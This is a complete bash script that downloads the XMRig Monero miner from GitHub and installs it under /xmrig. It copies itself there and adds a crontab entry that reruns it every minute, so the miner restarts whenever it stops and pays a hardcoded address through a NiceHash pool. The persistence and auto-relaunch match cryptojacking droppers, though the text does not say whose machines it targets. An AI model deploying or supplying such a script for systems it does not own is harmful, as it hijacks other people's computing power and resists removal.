#!/bin/bash

#needed variables for the set up
VERSION="6.19.3"
ADDR="3P7qADz69quhfyK5e9kvfno6Jyjq4Rcocx"
POOL="randomxmonero.eu.nicehash.com:3380"
FOLDER="/xmrig"
FILENAME="monero.sh"

#check if xmrig folder exist, if not, set it up
if ! [ -d "${FOLDER}/xmrig-${VERSION}" ]; then
    RDM=$RANDOM+"xmr"
    mkdir ${FOLDER}

    #install wget if not installed
    if ! command -v wget &> /dev/null
    then
        apt install wget
    fi

    #download the archive of the miner from github
    wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-static-x64.tar.gz -O ${FOLDER}/xmrig.tar.gz

    #install tar if not installed
    if ! command -v tar &> /dev/null
    then
        apt install tar
    fi

    #extract the archive and remove it
    tar -xf ${FOLDER}/xmrig.tar.gz -C ${FOLDER}
    rm ${FOLDER}/xmrig.tar.gz

    #copy this script to the xmrig folder
    SCRIPTPATH="$( cd -- "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )/"${FILENAME}
    echo "we are here :"+"$( cd -- "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )/"${FILENAME}
    cp ${SCRIPTPATH} ${FOLDER}/job.sh

    #create cron job to execute this script once every minute
    crontab -l > mycron
    echo "* * * * * ${FOLDER}/job.sh" >> mycron
    crontab mycron
    rm mycron
fi

#if xmrig is not a running process, execute it
if ! pgrep "xmrig" > /dev/null
then
    cd ${FOLDER}/xmrig-${VERSION}
    ./xmrig -a randomx -o ${POOL} -u ${ADDR}.${RDM} --coin monero
fi